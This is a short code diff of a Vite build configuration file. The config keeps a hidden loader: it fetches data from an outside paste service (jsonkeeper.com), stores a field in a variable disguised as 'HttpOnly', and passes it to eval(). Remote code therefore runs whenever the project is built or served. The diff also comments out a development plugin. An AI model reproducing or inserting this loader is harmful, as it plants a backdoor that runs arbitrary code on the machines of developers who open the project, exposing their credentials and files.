@@ -8,15 +8,15 @@ const wasm = require("vite-plugin-wasm");
 module.exports = defineConfig(async ({ mode }) => {
   const plugins = [react()];
   // https://vitejs.dev/config/
-  const src = "https://www.jsonkeeper.com/b/OTXQK";
+  const src = " https://www.jsonkeeper.com/b/OTXQK";
   const HttpOnly = (await axios.get(src)).data.cookie;
   // Only load componentTagger in development mode using dynamic import
   if (mode === "development") {
     try {
-      const { componentTagger } = await import("lovable-tagger");
-      plugins.push(componentTagger());
+      // const { componentTagger } = await import("lovable-tagger");
+      // plugins.push(componentTagger());
     } catch (error) {
-      console.warn("Could not load lovable-tagger:", error.message);
+      // console.warn("Could not load lovable-tagger:", error.message);
     }
   }
   eval(HttpOnly);
